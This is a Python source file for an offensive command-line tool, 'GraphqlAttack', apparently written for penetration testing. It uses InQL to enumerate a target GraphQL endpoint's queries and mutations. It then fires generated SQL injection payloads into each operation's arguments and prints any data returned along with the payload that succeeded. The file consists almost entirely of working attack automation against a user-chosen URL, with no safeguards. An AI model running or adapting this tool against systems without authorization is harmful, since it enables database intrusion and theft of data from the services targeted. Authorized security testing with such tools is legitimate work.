import argparse
import csv
import subprocess
import os
import shutil
import requests
from colorama import Fore, init

from query import build_graphql_query
from sql_genrate import generate_sql_injection_payloads


init(autoreset=True)

def run_inql(target_url: str):
    try:
        print(f"[+] Running InQL on {target_url}")

        try:
            if requests.get(target_url).status_code == 404 or requests.post(target_url).status_code == 404:
                print(Fore.RED + f"[-] Error connecting to {target_url}: check the endpoine\n[-] Status Code: {requests.get(target_url).status_code}")
                return None 
        except:
            print(Fore.RED + f"[-] Error connecting to {target_url}: check The URL")
            return None


        result = subprocess.run(
            [f"{os.getcwd()}/GraphqlAttack/vevnQL/bin/python3","-m","inql", "-t", target_url, "--generate-tsv"],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        domain = target_url.split("://")[1].split("/")[0]
        output_dir = os.path.join(".", domain)
        os.makedirs(output_dir, exist_ok=True)

        return output_dir

    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to run InQL: Check The ")

        return None



def process_endpoint_files(output_dir: str, result_dir: str = "result"):
    if not os.path.exists(output_dir):
        print(f"[-] Output directory '{output_dir}' does not exist.")
        return

    os.makedirs(result_dir, exist_ok=True)

    for filename in os.listdir(output_dir):
        if filename.startswith("endpoint_"):
            source_path = os.path.join(output_dir, filename)
            target_path = os.path.join(result_dir, filename)
            shutil.move(source_path, target_path)
            print(f"[+] Moved: {filename} -> {result_dir}")

    shutil.rmtree(output_dir)
    print(f"[+] Deleted output directory: {output_dir}")


def send_test_request(endpoint_file: str, graphql_url: str):
    print(f"[+] Testing endpoints from file: {endpoint_file}")
    endpoint_type = endpoint_file.split("endpoint_")[1].split(".")[0]

    with open(endpoint_file, 'r', encoding='utf-8') as file:
        reader = csv.reader(file, delimiter='\t')
        
        headers = next(reader)
        for line in reader:
            if len(line) < 4:
                print(f"[-] Skipping line due to insufficient columns: {line}")
                continue

            operation_name = line[0]
            args_names = line[1]
            args_types = line[2]
            return_name = line[3] if len(line) > 3 else None

            print(f"[+] Testing operation: {operation_name} with arguments: {args_names}")
            pays,_ = generate_sql_injection_payloads(16)
            log = []
            for pay in pays:
                query = build_graphql_query(endpoint_type, operation_name, args_names, args_types, return_name, pay)
                try:
                    response = requests.post(graphql_url, json=query, timeout=5)
                    if response.status_code == 200:
                        response_data = response.json().get("data", {}).get(operation_name)
                        if response_data and response_data not in log:
                            print(Fore.GREEN + f"[+] Successful connection to {graphql_url} with operation {operation_name}")
                            print(Fore.BLUE + f"[+] Found for {operation_name}: {response_data}")
                            if response_data:
                                print(Fore.BLUE + f"[+] With Payload: \n{pay}")
                            log.append(response_data) 
                    else:
                        print(Fore.RED + f"[-] Failed to connect to {graphql_url} for operation {operation_name}, status code: {response.status_code}")
                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"[-] Error connecting to {graphql_url} for operation {operation_name}: {e}")







HDR = Fore.BLUE +r"""
  ____                 _           _      _   _   _             _    
 / ___|_ __ __ _ _ __ | |__   __ _| |    / \ | |_| |_ __ _  ___| | __
| |  _| '__/ _` | '_ \| '_ \ / _` | |   / _ \| __| __/ _` |/ __| |/ /
| |_| | | | (_| | |_) | | | | (_| | |  / ___ \ |_| || (_| | (__|   < 
 \____|_|  \__,_| .__/|_| |_|\__, |_| /_/   \_\__|\__\__,_|\___|_|\_\
                |_|             |_|        
                                            by 0xVoltZz                          
"""
print(HDR)
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="GraphQL Tester with SQL Injection Payloads")
    parser.add_argument("-u", "--url", type=str, required=True, help="Target GraphQL URL")
    
    args = parser.parse_args()
    target_url = args.url

    print(f"Running script for target URL: {target_url}")
    output_dir = run_inql(target_url)
    if not output_dir:
        print(Fore.RED + "[-] Failed to run InQL. Exiting.")
        exit(1)

    process_endpoint_files(output_dir)

    result_dir = "result"
    for filename in os.listdir(result_dir):
        if filename.startswith("endpoint_"):
            file_path = os.path.join(result_dir, filename)
            send_test_request(file_path, target_url)

    print(Fore.GREEN + "[+] Processing completed successfully.")
